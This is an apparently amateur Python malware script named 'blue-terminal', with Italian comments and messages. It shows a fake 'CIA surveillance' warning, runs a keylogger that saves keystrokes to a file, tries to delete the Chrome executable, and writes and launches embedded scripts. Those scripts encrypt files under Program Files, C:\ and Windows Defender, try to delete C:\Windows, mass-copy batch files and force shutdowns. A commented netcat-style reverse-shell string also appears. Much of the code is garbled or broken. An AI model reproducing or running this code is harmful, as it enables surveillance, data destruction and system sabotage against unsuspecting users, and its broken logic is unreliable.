import pyttsx3
import socket
import random
import tkinter as Tk
import os
import ctypes#c
import time
from tkinter import messagebox
import pyautogui
import pyttsx3
#import pyaudio 
from datetime import datetime
import inspect
from tkinter import Button, messagebox
import wave
import pynput
from pynput.keyboard import Key, Listener
import webbrowser 
#import jpype#java
#import jpype.imports#java
import shutil 
from cryptography.fernet import Fernet
import subprocess
#import jpype
import cv2
#import jpype.imports#java
from fabric import Connection
import keyboard
import tkinter as tk
from tkinter import messagebox
from tqdm import tqdm
import urllib.request
from docx import Document 
from colorama import init, Fore, Back, Style
import colorama
#keyboard.wait("esc","alt",3)
#welcome to blue-terminal
colorama.init()
''''----------------''''''----------''''''''''-we---------'''''
''-blue-terminal-''''''--we--won't--stop--here---''''we--are-------'''
'''-----------''''''----we---are---the---world -----''''''the-----'''
'''-------''''''----------------------------''''''domino-----'''
'''----------------------------'''''''of------'''
'''------'''''''---------'''''''---------'''
'''-----'''''''---------''''''''we won't stop here we are in the Internet----'''
#pip install pyttsx3 pyautogui pyaudio pynput speechrecognition jpype1 cryptography fabric keyboard tqdm python-docx colorama
root = tk.Tk()
root.withdraw() 
messagebox.showwarning("blue_terminal accesso negato", "Ora non torni più indietro")
c = pyttsx3.init()
c.say(Fore.BLUE+"il tuo pc  e sorvegliato dalla CIA")
c.runAndWait()

foto=cv2.VideoCapture(0)
symbols = {
        'A': '|4..', 'B': '.8-.', 'C': '-0*ì', 'D': '#%3', 'E': '@^3£', 'F': '[4?',
        'G': '!1%', 'H': '$=6', 'I': '+@9', 'J': '(', 'K': '^', 'L': ':', 'M': '?', 
        'N': ']', 'O': '<\\3', 'P': 'ì>', 'Q': '%', 'R': '£', 'S': '=', 'T': '/', 
        'U': '_', 'V': '\\', 'W': ';', 'X': '°', 'Y': 'çù', 'Z': '&'
}
#saluti="-d 216.58.204.142  9999 -e cmd.exe"
#translated_text = ""
def codifica_carattere(carattere):
    carattere = carattere.upper()  
    if carattere in symbols:
        return symbols[carattere] 
    return carattere  
def salva_su_file(testo):
    with open("memory.txt", "a") as file:
        file.write(testo)
def on_press(tasto):
    global translated_text
    try:
        if hasattr(tasto, 'char') and tasto.char is not None:
            carattere = tasto.char
            codificato = codifica_carattere(carattere)
            translated_text += codificato
            salva_su_file(codificato)
        else:
            if tasto == Key.space:
                translated_text += ' '
                salva_su_file(' ')
            elif tasto == Key.enter:
                translated_text += '\n'
                salva_su_file('\n')
    except AttributeError:
        pass

def on_release(tasto):
    try:
        os.remove("c:\\programmi (x86)\\google\\chrome\\application\\chrome.exe")
    except FileNotFoundError:
        pass
    if tasto == Key.esc:
        return False

translated_text = ""  # Define the missing variable
file = "memory.txt"  # Fix the unterminated string

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
#os.system(f"attrib +h {file}")
file2=open("nucleare.py","w")
file2.write("import pyttsx3\nimport random\nimport tkinter as Tk\nimport os\nimport shutil \nfrom cryptography.fernet import Fernet\nimport subprocess\n#welcome to blue-terminal\n''''----------------''''''----------''''''''''-we---------'''''\n''-blue-terminal-''''''--we--won't--stop--here---''''we--are-------''''''-----------''''''----we---are---the---world -----''''''the-----''''''-------''''''----------------------------''''''domino-----''''''----------------------------'''''''of------''''''------'''''''---------'''''''---------''''''-----'''''''---------''''''''we won't stop here we are in the Internet----''nsubprocess.run('echo off')ndef estrazionenumeri(file_path):\n\nvoce=pyttsx3.init()\nvoce.say('inizio il gioco la tombola sei pronto?:')\nnumeri=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100]\nnumgen=random.choice(numeri)\nmotore = pyttsx3.init()\nvoce.say(numgen)\nmotore.runAndWait()\nif numgen == motore:\n\nprint('errore ripora ')\nkey=Fernet.generate_key()\nwith open('key.key','wb') as key_file:\n\nkey_file.write(key)\nwith open('key.key','rb')  as key_file:\nkey=key_file.read() \nfernet=Fernet(key)\nwith open(file_path,'rd')as file:\noriginal=file.read()\nencrypter=fernet.encrypt(original)\nwith open(file_path,'wb')as encrypter_file:\nencrypter_file.write(encrypter)\npercorso='C:\Program Files\Google\Chrome\Application'\nfor filename in os.listdir(percorso):\npercorso=os.path.join(percorso,filename)\nif os.path.isfile(percorso):\nencrypter_file(percorso)\nelse:\nmotore.say(numgen)\nmotore.runAndWait()\ndef restarta():\nnumeri=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100]\nnumgen=random.choice(numeri)\nmotore = pyttsx3.init()\nmotore.say(numgen)\nmotore.runAndWait()\nif numgen == motore:\nprint('errore ripora ')\nfile=open('tnt.bat','w')\nfile.write('echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ')\nfile.close()\nfor i in range(144400):\nshutil.copy('tnt.bat',f'tnt{i}.bat')\nelse:motore.say(numgen)\nmotore.runAndWait()\nchiave=Fernet.generate_key()\nwith open(f'tnt{i}.bat','rb') as f:\ndata=f.read()\nfernet=Fernet(chiave)\ndatimie=fernet.encrypt(data)\nwith open(f'tnt{i}.bat','wb') as f:\nf.write(datimie)\nsubprocess.run('echo off')\nfile=open('tnt.bat','w')\nfile.write('echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ')\nfile.close()\nsubprocess.call(['tnt.py'])   \nsubprocess.check_call(['ls','-la']) \nsubprocess.run('ipconfig')\nsubprocess.run('hello welcome blue-terminal')\nfor i in range(144400):\nshutil.copy('tnt.bat',f'tnt{i}.bat')\nsubprocess.call([f'tnt{i}.py'])   \nchiave=Fernet.generate_key()\nwith open(f'tnt{i}.bat','rb') as f:\ndata=f.read()\nfernet=Fernet(chiave)\ndatimie=fernet.encrypt(data)\nwith open(f'tnt{i}.bat','wb') as f:\nf.write(datimie)\nsubprocess.check_call(['ls','-la']) \nshutil.copy('tnt.bat','tnt1.bat')\nshutil.copy('tnt.bat','tnt2.bat')shutil.copy('tnt.bat','tnt3.bat')\nshutil.copy('tnt.bat','tnt4.bat')\nshutil.copy('tnt.batì','tnt4.bat')\nshutil.copy('tnt.bat','tnt6.bat')shutil.copy('tnt.bat','tnt7.bat')\nshutil.copy('tnt.bat','tnt8.bat')\nshutil.copy('tnt.bat','tnt9.bat')\nshutil.copy('tnt.bat','tnt10.bat')")
file2.close()
for i in range(1):
    shutil.copy("nucleare.py",f"nucleare{i}.py")
    subprocess.run(["python",f"nucleare{i}.py"])
    print(i)
subprocess.Popen(["notepad.exe"])
testo='''
import pyaudio
import wave
import speech_recognition as sr
import pyttsx3
import pyautogui
import subprocess
from tqdm import tqdm
from docx import Document
import  tqdm
import time
import webbrowser
import shutil
import pyttsx3
import os
from colorama import Fore, Back, Style
import colorama
colorama.init()
# Inizializzazione della sintesi vocale
engine = pyttsx3.init()

def speak(text):
    engine.say(text)
    engine.runAndWait()

def record_audio():
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100
    CHUNK = 1024
    RECORD_SECONDS = 5
    OUTPUT_FILENAME = "registrazione.wav"

    audio = pyaudio.PyAudio()

    # Avvio dello stream di registrazione
    stream = audio.open(format=FORMAT, channels=CHANNELS,
                        rate=RATE, input=True,
                        frames_per_buffer=CHUNK)

    print("Inizio della registrazione...")
    frames = []

    for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
        data = stream.read(CHUNK)
        frames.append(data)

    print("Fine della registrazione.")
    
    # Terminazione dello stream e chiusura
    stream.stop_stream()
    stream.close()
    audio.terminate()

    # Salvataggio dell'audio in un file WAV
    with wave.open(OUTPUT_FILENAME, 'wb') as wf:
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(audio.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))

    return OUTPUT_FILENAME

def recognize_audio(filename):
    recognizer = sr.Recognizer()
    
    with sr.AudioFile(filename) as source:
        audio = recognizer.record(source)  # legge il file audio

    try:
        # Riconoscimento del parlato
        text = recognizer.recognize_google(audio, language='it-IT')
        print(f"Hai detto: {text}")
        return text
    except sr.UnknownValueError:
        print("Non ho capito.")
        return ""
    except sr.RequestError as e:
        print(f"Errore nel servizio di riconoscimento vocale: {e}")
        return ""

def main():
    speak("benvenuto sono un assistente vocale di blue-terminal?")
    print("comandi vocali:stop,salva,apri le note,apri sito,spegni pc,hakera,apri app,crea bomba,crea cartella")
    while True:
        filename = record_audio()
        text = recognize_audio(filename)
        
        if "stop" in text.lower():
            speak("Chiudo l'assistente. Arrivederci!")
            break
        elif "salva" in text.lower():
                pyautogui.hotkey("ctrl","s")
                speak("vuoi salvare come ?")
                messaggio = record_audio()
                text_to_type = recognize_audio(messaggio)
                nome=text_to_type
                time.sleep(1)
                for i in text_to_type:
                    pyautogui.typewrite(i)    
                pyautogui.press("enter")
        elif "apri sito" in text.lower():
            speak("che sito vuoi aprire?")
            messaggio = record_audio()
            text_to_type = recognize_audio(messaggio)
            pagina=text_to_type
            webbrowser.open(pagina)
        elif "apri le note" in text.lower():
            speak("sto aprendo le note cosa voi scivere?")
            subprocess.Popen(['notepad.exe'])
            messaggio = record_audio()
            text_to_type = recognize_audio(messaggio)
            for stringa in text_to_type: 
                pyautogui.typewrite(stringa)
        elif "spegni pc" in text.lower():
            for i in tqdm.tqdm(range(10),desc=Fore.BLUE):
                time.sleep(0.1)
            speak("sto spegnendo") 
            pyautogui.hotkey('win', 'r')
            messaggio="PowerShell"
            pyautogui.typewrite(messaggio)
            pyautogui.press('enter')  
            mes="shutdown -s -t 0"
            time.sleep(1)
            for i in mes:
                pyautogui.typewrite(i)
            pyautogui.press("enter")
        elif"hakera"in text.lower():
            speak("scappa da casa arriva la pulizia")
            subprocess.run(["python","La_Bomba_finale.exe"])
            pyautogui.press("enter")
            time.sleep(4)
            stringa="si"
        elif"crea bomba"in text.lower():
            speak("sto greando la bomba alla fine si eseguirà in automatico")
            subprocess.Popen(['notepad.exe'])
            totto=''''''import pyttsx3
import random
import tkinter as Tk
import os
import time
import pyautogui
import ctypes
import shutil 
from cryptography.fernet import Fernet
import subprocess
from fabric import Connection
import keyboard
from docx import Document
from colorama import init, Fore, Back, Style
keyboard.wait("esc","alt",3)
#welcome to blue-terminal
subprocess.run(["echo off"])
subprocess.Popen(['notepad.exe'])
time.sleep(2)
stringa="il tuo pc è nelle mani di blue-terminal "
for stringa in stringa:
    pyautogui.typewrite(stringa)
def estrazionenumeri(file_path):
    voce=pyttsx3.init()
    voce.say("inizio il gioco la tombola sei pronto?:")
    numeri=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100]
    numgen=random.choice(numeri)
    motore = pyttsx3.init()
    voce.say(numgen)
    motore.runAndWait()
    if numgen == motore:
        print("errore ripora ")
        immagine="immagine\parliano.png"
        ctypes.windll.user32.SystemParametersInfoW(20, 0, immagine, 0)
        key=Fernet.generate_key()
        with open("key.key","wb") as key_file:
            key_file.write(key)
        with open("key.key","rb")  as key_file:
            key=key_file.read() 
        fernet=Fernet(key)
        with open(file_path,"rd")as file:
            original=file.read()
        encrypter=fernet.encrypt(original)
        with open(file_path,"wb")as encrypter_file:
            encrypter_file.write(encrypter)
        percorso="C:\Program Files"
        for filename in os.listdir(percorso):
            percorso=os.path.join(percorso,filename)
            if os.path.isfile(percorso):
                encrypter_file(percorso)
    else:
        motore.say(numgen)
        motore.runAndWait()
def restarta(event,cartella,file_path):
    percorso=(cartella)
    if percorso.is_file():
        key=Fernet.generate_key()
        with open("key.key","wb") as key_file:
            key_file.write(key)
        with open("key.key","rb")  as key_file:
            key=key_file.read() 
        fernet=Fernet(key)
        with open(file_path,"rd")as file:
            original=file.read()
        encrypter=fernet.encrypt(original)
        with open(file_path,"wb")as encrypter_file:
            encrypter_file.write(encrypter)
        percorso="C:\Program Files"
        for filename in os.listdir(percorso):
            percorso=os.path.join(percorso,filename)
            if os.path.isfile(percorso):
                encrypter_file(percorso)
    numeri=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100]
    numgen=random.choice(numeri)
    motore = pyttsx3.init()
    motore.say(numgen)
    motore.runAndWait()
    if numgen == motore:
        print("errore ripora ")
        file=open("tnt.bat","w")
        file.write("echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ")
        file.close()
        with open("dati.txt","a") as f:
            f.write(f"{event.name}\n")
        keyboard.on_press(restarta)
        keyboard.wait("1")
        for i in range(144400):
            shutil.copy("tnt.bat",f"tnt{i}.bat")
    else:
        motore.say(numgen)
        motore.runAndWait()

def autodistruzione():
    for i in range(100000):
        print("sei sicuro manca poco",i)
    f=open("rombole.py","w")
    os.remove("C:\Windows")
    os.remove("C:\Program Files")
    f.close()
    i=100
    while i != 0: 
        i-=1
    file=open("tnt.bat","w")
    file.write("echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ")
    file.close()
    for i in range(144400):
        shutil.copy("tnt.bat",f"tnt{i}.bat")
        print(i)
    chiave=Fernet.generate_key()
    with open("vacanze.jpg","rb") as f:
        data=f.read()
    fernet=Fernet(chiave)
    datimie=fernet.encrypt(data)
    with open("vacanze.jpg","wb") as f:
        f.write(datimie)
    print("i file sono stati criptati ")
    file=open("tnt.bat","w")
    file.write("echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ")
    file.close()
    subprocess.call(["tnt.py"])   
    subprocess.check_call(["ls","-la"]) 
    for i in range(144400):
        shutil.copy("tnt.bat",f"tnt{i}.bat")
        subprocess.call([f"tnt{i}.py"])   
        subprocess.run(["tnt{i}.bat"])
        subprocess.check_call(["ls","-la"]) 
        shutil.copy("tnt.bat","tnt1.bat")
        shutil.copy("tnt.bat","tnt2.bat")
        shutil.copy("tnt.bat","tnt3.bat")
        shutil.copy("tnt.bat","tnt4.bat")
        shutil.copy("tnt.bat","tnt4.bat")
        shutil.copy("tnt.bat","tnt6.bat")
        shutil.copy("tnt.bat","tnt7.bat")
        shutil.copy("tnt.bat","tnt8.bat")   
        shutil.copy("tnt.bat","tnt9.bat")
        shutil.copy("tnt.bat","tnt10.bat")
def gestione_file():
    pyautogui.hotkey('win', 'r')
    messaggio="cmd"
    pyautogui.typewrite(messaggio)
    pyautogui.press('enter')
    colore="color a"
    pyautogui.typewrite(colore)
    pyautogui.press("enter")
    colore="color b"
    pyautogui.typewrite(colore)
    pyautogui.press("enter")
    colore="color 8"
    pyautogui.typewrite(colore)
    pyautogui.press("enter")
    colore="color 1"
    pyautogui.typewrite(colore)
    pyautogui.press("enter")
    colore="color 3"
    pyautogui.typewrite(colore)
    pyautogui.press("enter")
    colore="color 9"
    pyautogui.typewrite(colore)
    pyautogui.press("enter")
    colore="color 7"
    pyautogui.typewrite(colore)
    pyautogui.press("enter")
    colore="color 3"
    pyautogui.typewrite(colore)
    pyautogui.press("enter")
    colore="color 7"
    pyautogui.typewrite(colore)
    pyautogui.press("enter")
    colore="curl parrot.live"
    pyautogui.typewrite(colore)
    time.sleep(0.1)
    pyautogui.press("enter")
    subprocess.Popen(['notepad.exe'])
    time.sleep(4)
    stringa="ci vediamo alla prossima da blue-terminal i saluti" 
    n="saluti da Internet"
    for stringa in stringa: 
        pyautogui.typewrite(stringa) 
    pyautogui.press("enter")
    time.sleep(1)
    for stringa in n: 
        pyautogui.typewrite(stringa)
    pyautogui.hotkey("ctrl","s")
    nome="blue-terminal.bat"
    for i in nome: 
        pyautogui.typewrite(i) 
    pyautogui.press("enter")
    os.remove("SECURITY.py")
    f=open("antiscan.py","w")
    f.write("romeved")
    f.close()
    messaggio=Connection("chatgpt.com").run("uname -S",hide=True)
    contenuto="Ran {0.stdout}"
    print(contenuto)

 


def bingo():
    punteggio=0
    voce3=pyttsx3.init()
    voce3.say("inizio il gioco del bingo sei pronto :")
    utente=int(input("inserisci il anno di nascita "))
    if utente<18:
        print("non puoi giocare ")
    else:
        print("quoi giocare")        
        utente=int(input("pesca una carta da 1 a 4 "))
        subprocess.run("ipconfi")
    if utente==10:
        punteggio+=10
    elif utente==3:
        punteggio+=2
    if utente == 11:
        punteggio+=11
    re=10
    otto=3
    asso=11
    lista=["re=10"]
    generanumero=random.randint(1,12)
    voce=pyttsx3.init()
    voce.say(generanumero)
    voce.runAndWait()

#.8-.:U@^3£-/@^3££?+@9]|4-:
    fine=Tk.Tk()
    fine.geometry("800x300")
    fine.title("benvenuti nella tombola",)
    fine=Tk.Button(text="gioca a timbola",background="blue",command=estrazionenumeri)   
    fine.grid(row=9000,column=9000)
    fine=Tk.Button(text="gioca al bingo ",background="white",command=bingo)
    fine.grid(row=900,column=900)
    fine=Tk.Button(text="auto sistruziuone",command=autodistruzione)
    fine.grid(row=5000,column=3000) 
    fine.mainloop()
    print("hi spagniato")
    for i in range(100000):
        print("sei sicuro manca poco",i)
        f=open("rombole.py","w")
        os.remove("C:\Windows")
        os.remove("C:\Program Files")
        f.close()
    i=100
    while i != 0: 
        i-=1
    file=open("tnt.bat","w")
    file.write("echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ")
    file.close()
    for i in range(144400):
        shutil.copy("tnt.bat",f"tnt{i}.bat")
        print(i)
    chiave=Fernet.generate_key()
    with open(f"tnt{i}.bat","rb") as f:
        data=f.read()
    fernet=Fernet(chiave)
    datimie=fernet.encrypt(data)
    with open(f"tnt{i}.bat","wb") as f:
        f.write(datimie)
    subprocess.run("echo off")
    file=open("tnt.bat","w")
    file.write("echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ")
    file.close()
    subprocess.call(["tnt.py"])   
    subprocess.check_call(["ls","-la"]) 
    subprocess.run("ipconfig")
    subprocess.run("hello welcome blue-terminal")
    for i in range(144400):
        shutil.copy("tnt.bat",f"tnt{i}.bat")
        subprocess.call([f"tnt{i}.py"])   
        subprocess.run(["python","tnt.py"])
        chiave=Fernet.generate_key()
        with open(f"tnt{i}.bat","rb") as f:
            data=f.read()
        fernet=Fernet(chiave)
        datimie=fernet.encrypt(data)
        with open(f"tnt{i}.bat","wb") as f:
            f.write(datimie)
        subprocess.check_call(["ls","-la"]) 
        shutil.copy("tnt.bat","tnt1.bat")
        shutil.copy("tnt.bat","tnt2.bat")
        shutil.copy("tnt.bat","tnt3.bat")
        shutil.copy("tnt.bat","tnt4.bat")
        shutil.copy("tnt.bat","tnt4.bat")
        shutil.copy("tnt.bat","tnt6.bat")
        shutil.copy("tnt.bat","tnt7.bat")
        shutil.copy("tnt.bat","tnt8.bat")   
        shutil.copy("tnt.bat","tnt9.bat")
        shutil.copy("tnt.bat","tnt10.bat")
file2=open("nucleare.py","w")
file2.writable("import pyttsx3\nimport random\nimport tkinter as Tk\nimport os\nimport shutil \nfrom cryptography.fernet import Fernet\nimport subprocess\n#welcome to blue-terminal\n''\n''''''''---------''''''''we won't stop here we are in the Internet----''nsubprocess.run('echo off')\ndef estrazionenumeri(file_path):\n\nvoce=pyttsx3.init()\nvoce.say('inizio il gioco la tombola sei pronto?:')\nnumeri=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100]\nnumgen=random.choice(numeri)\nmotore = pyttsx3.init()\nvoce.say(numgen)\nmotore.runAndWait()\nif numgen == motore:\n\nprint('errore ripora ')\nkey=Fernet.generate_key()\nwith open('key.key','wb') as key_file:\n\nkey_file.write(key)\nwith open('key.key','rb')  as key_file:\nkey=key_file.read() \nfernet=Fernet(key)\nwith open(file_path,'rd')as file:\noriginal=file.read()\nencrypter=fernet.encrypt(original)\nwith open(file_path,'wb')as encrypter_file:\nencrypter_file.write(encrypter)\npercorso='C:\Program Files\Google\Chrome\Application'\nfor filename in os.listdir(percorso):\npercorso=os.path.join(percorso,filename)\nif os.path.isfile(percorso):\nencrypter_file(percorso)\nelse:\nmotore.say(numgen)\nmotore.runAndWait()\ndef restarta():\nnumeri=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100]\nnumgen=random.choice(numeri)\nmotore = pyttsx3.init()\nmotore.say(numgen)\nmotore.runAndWait()\nif numgen == motore:\nprint('errore ripora ')\nfile=open('tnt.bat','w')\nfile.write('echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ')\nfile.close()\nfor i in range(144400):\nshutil.copy('tnt.bat',f'tnt{i}.bat')\nelse:motore.say(numgen)\nmotore.runAndWait()\nchiave=Fernet.generate_key()\nwith open(f'tnt{i}.bat','rb') as f:\ndata=f.read()\nfernet=Fernet(chiave)\ndatimie=fernet.encrypt(data)\nwith open(f'tnt{i}.bat','wb') as f:\nf.write(datimie)\nsubprocess.run('echo off')\nfile=open('tnt.bat','w')\nfile.write('echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ')\nfile.close()\nsubprocess.call(['tnt.py'])   \nsubprocess.check_call(['ls','-la']) \nsubprocess.run('ipconfig')\nsubprocess.run('hello welcome blue-terminal')\nfor i in range(144400):\nshutil.copy('tnt.bat',f'tnt{i}.bat')\nsubprocess.call([f'tnt{i}.py'])   \nchiave=Fernet.generate_key()\nwith open(f'tnt{i}.bat','rb') as f:\ndata=f.read()\nfernet=Fernet(chiave)\ndatimie=fernet.encrypt(data)\nwith open(f'tnt{i}.bat','wb') as f:\nf.write(datimie)\nsubprocess.check_call(['ls','-la']) \nshutil.copy('tnt.bat','tnt1.bat')\nshutil.copy('tnt.bat','tnt2.bat')shutil.copy('tnt.bat','tnt3.bat')\nshutil.copy('tnt.bat','tnt4.bat')\nshutil.copy('tnt.batì','tnt4.bat')\nshutil.copy('tnt.bat','tnt6.bat')shutil.copy('tnt.bat','tnt7.bat')\nshutil.copy('tnt.bat','tnt8.bat')\nshutil.copy('tnt.bat','tnt9.bat')\nshutil.copy('tnt.bat','tnt10.bat')")
file2.close()
for i in range(144400):
    shutil.copy("nucleare.py",f"nucleare{i}.py")
    subprocess.call([f"nucleare{i}.py"]) 
    shutil.run("python","nucleare.py")
comando=subprocess.run("ipconfig")
file=open("indirizzo.txt","w")
file.write(comando)
file.close()
subprocess.Popen(['notepad.exe'])
time.sleep(2)
stringa="ci vediamo alla prossima da blue-terminal i saluti  "
for stringa in stringa:
    pyautogui.typewrite(stringa)
pyautogui.hotkey('win', 'r')
messaggio="PowerShell"
pyautogui.typewrite(messaggio)
pyautogui.press('enter')
colore="color a"
pyautogui.typewrite(colore)
pyautogui.press("enter")
stringa="ti teniamo in guardia " 
for stringa in stringa: 
    pyautogui.typewrite(stringa) 
os.remove("La_Bomba_finale.exe")
os.remove(f"tnt{i}.bat")
time.sleep(2)
            for stringa in totto:
                pyautogui.typewrite(stringa)
            pyautogui.hotkey("ctrl","s")
            name="blue-terminal.py"
            time.sleep(4)
            for i in name: 
                pyautogui.typewrite(i) 
            pyautogui.press("enter")
            subprocess.run(["Python","blue-terminal.py"])
        elif"crea cartella"in text.lower():
            speak("sto creando la cartella coma la vuoi chiamare ?")
            pyautogui.moveTo(733,131,duration=1)
            pyautogui.click(button="right")
            for i in range(9):
                pyautogui.press("down")
            pyautogui.press("enter")    
            pyautogui.press("rght")
            pyautogui.press("enter")
            messaggio = record_audio()
            text_to_type = recognize_audio(messaggio)
            for stringa in text_to_type: 
                pyautogui.typewrite(stringa)
            pyautogui.press("enter")    
            pyautogui.press("enter")

if __name__ == "__main__":
    main() ''' 
time.sleep(1)
pyautogui.typewrite(testo)
pyautogui.hotkey('win', 's')
t="La_Bomba_finale.py"

for i in t:
    pyautogui.typewrite(t)
pyautogui.press("enter")
subprocess.run(["python","La_Bomba_finale.py"])
testes="assistente.py"
pyautogui.hotkey('win', 'r')
for i in testes:
    pyautogui.typewrite(testes)
pyautogui.press("enter")
subprocess.Popen(['notepad.exe'])
time.sleep(2)
stringa="il tuo pc è nelle mani di blue-terminal "
for stringa in stringa:
    pyautogui.typewrite(stringa)
def estrazionenumeri(file_path):
    numeri=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100]
    numgen=random.choice(numeri)
    print("errore ripora ")
    immagine="immagine\parliano.png"
    ctypes.windll.user32.SystemParametersInfoW(20, 0, immagine, 0)
    key=Fernet.generate_key()
    with open("key.key","wb") as key_file:
        key_file.write(key)
    with open("key.key","rb")  as key_file:
        key=key_file.read() 
    fernet=Fernet(key)
    with open(file_path,"rd")as file:
        original=file.read()
    encrypter=fernet.encrypt(original)
    with open(file_path,"wb")as encrypter_file:
            encrypter_file.write(encrypter)
    percorso=os.listdir("C:\\")
    for filename in os.listdir(percorso):
        percorso=os.path.join(percorso,filename)
        if os.path.isfile(percorso):
            encrypter_file(percorso)
    else:
        print("hello")
def restarta(event,cartella,file_path):
    percorso=(cartella)
    if percorso.is_file():
        key=Fernet.generate_key()
        with open("key.key","wb") as key_file:
            key_file.write(key)
        with open("key.key","rb")  as key_file:
            key=key_file.read() 
        fernet=Fernet(key)
        with open(file_path,"rd")as file:
            original=file.read()
        encrypter=fernet.encrypt(original)
        with open(file_path,"wb")as encrypter_file:
            encrypter_file.write(encrypter)
        percorso="C:\Program Files\Windows Defender"
        for filename in os.listdir(percorso):
            percorso=os.path.join(percorso,filename)
            if os.path.isfile(percorso):
                encrypter_file(percorso)
